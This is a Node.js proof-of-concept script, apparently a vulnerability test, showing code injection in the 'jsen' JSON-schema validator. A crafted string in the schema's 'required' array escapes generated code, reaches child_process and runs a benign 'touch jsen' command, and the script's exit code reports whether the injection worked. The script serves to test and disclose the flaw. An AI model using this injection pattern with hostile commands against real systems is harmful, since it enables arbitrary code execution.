if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const jsen = require("jsen");
const path = "./jsen";
file_exist = fs.existsSync(path);
console.log("a", file_exist);
let schema = JSON.parse(
	JSON.stringify({
		type: "object",
		properties: { username: { type: "string" } },
		required: [
			"\"+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('touch jsen')+\"",
		],
	}),
);
try {
	const validate = jsen(schema);
	validate({});
} catch (e) {
	console.log(e);
}
setTimeout(() => {
	file_exist = fs.existsSync(path);
	fs.unlink(path, function (err) {});
	console.log("b", file_exist);

	if (file_exist) {
		process.exit(0);
	} else {
		process.exit(82);
	}
}, 1);
